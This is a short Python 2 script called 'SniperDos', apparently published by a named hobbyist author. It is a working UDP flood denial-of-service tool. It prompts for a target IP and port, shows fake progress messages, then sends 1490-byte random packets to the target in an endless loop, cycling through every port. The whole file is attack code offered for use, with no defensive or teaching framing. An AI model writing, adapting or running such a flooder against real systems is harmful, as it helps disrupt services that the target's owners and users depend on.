import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet SniperDos")
print "Author    : Anubhav Kashyap"
print "github   : https://github.com/anubhavanonymous"
print "Instagram : https://www.instagram.com/anubhavanonymous"
print "No technology that's connected to the internet is unhackable"
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Starting SniperDos")
print "working "
time.sleep(5)
print "35% Done "
time.sleep(5)
print "56% Done"
time.sleep(5)
print "78% Done"
time.sleep(5)
print "100% Done"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
